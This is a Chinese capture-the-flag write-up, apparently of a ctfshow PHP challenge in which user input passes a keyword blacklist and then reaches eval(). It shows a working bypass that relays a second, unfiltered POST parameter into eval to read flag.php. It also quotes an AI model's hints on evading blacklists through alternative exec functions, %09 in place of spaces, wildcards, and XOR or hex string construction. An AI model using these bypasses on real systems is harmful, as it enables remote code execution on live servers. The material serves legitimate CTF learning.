题目提示依然是`命令执行，需要严格的过滤`，但是这题加强了过滤，把单引号`'`和空格` `都过滤了
```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 00:49:10
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```
我让 Gemini 3.8 Flash 给我一些提示，它提到：

**1. 参数传递转义（引入外部变量）**

* `eval($c);` 执行的是一段 PHP 语句。黑名单只对传入的 `c` 参数生效，但它并不会检查其他 GET 或 POST 参数。
* 思考：能否在 `$c` 中写一条语句，去动态接收并执行其他未受过滤检查的请求参数（比如 `$_POST` 或 `$_GET` 中的新键名）？

之前我还真没想到还能这么玩，于是我写了：
```php
/?c=$d=$_POST["d"];eval($d);
```

然后因为这个`$d`完全不会经过`preg_match`的过滤所以可以直接在 POST Body 里写
```
d=highlight_file('flag.php');
```
使用 HackBar 发送请求即可获得 Flag
```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:49:19
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 00:49:26
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

$flag="ctfshow{7c3ee7af-f3d5-407b-801d-ca992bf85ffb}";
```

<img width="2560" height="1523" alt="Image" src="https://github.com/user-attachments/assets/72f3a44b-0f8e-4197-afdf-3ca12aa43ba2" />

完整的 Gemini 3.8 Flash 回答：
面对这类字符过滤较多的 PHP 代码执行题目，核心思路通常不是直接硬刚所有黑名单，而是利用 **PHP 语言特性** 或 **参数传递机制** 来间接构造你想要的代码。

这里提供几个思考方向作为提示：

**1. 参数传递转义（引入外部变量）**

* `eval($c);` 执行的是一段 PHP 语句。黑名单只对传入的 `c` 参数生效，但它并不会检查其他 GET 或 POST 参数。
* 思考：能否在 `$c` 中写一条语句，去动态接收并执行其他未受过滤检查的请求参数（比如 `$_POST` 或 `$_GET` 中的新键名）？

**2. 替代的命令执行与文件读取函数**

* 黑名单过滤了 `system`、`cat`、`shell` 等常见词汇。
* PHP 中除了 `system`，还有很多其他执行系统命令的函数或机制（例如反引号、`passthru`、`exec` 等）。
* 如果目标是读取文件内容，除了系统命令外，PHP 本身自带许多文件操作函数（如用于高亮显示文件、读取整个文件到数组或字符串的内置函数）。

**3. 规避点号（`.`）与空格限制**

* **点号的作用：** 在 PHP 中点号常用于字符串拼接或文件名后缀（如 `.php`）。
* 针对字符串拼接：双引号内的变量解析、数组索引拼接、函数传参等方式均可避免直接写 `.`。
* 针对文件名匹配：在 Linux shell 中，通配符（如 `?` 或 `*`）可以匹配包括点号在内的任意字符。


* **空格替代：** 在 PHP 语法中，括号、反引号、制表符（URL 编码 `%09`）等都可以起到分隔作用，许多地方本身就不强制需要普通空格。

**4. 字符串构造与函数动态调用**

* PHP 支持动态函数调用，例如 `$func = "fun" . "ction"; $func();`。
* 哪怕不能使用点号连接，PHP 还支持利用十六进制编码（如 `"\x73\x79..."`）、取反（`~`）、异或（`^`）等位运算在不包含黑名单字符的情况下生成目标字符串。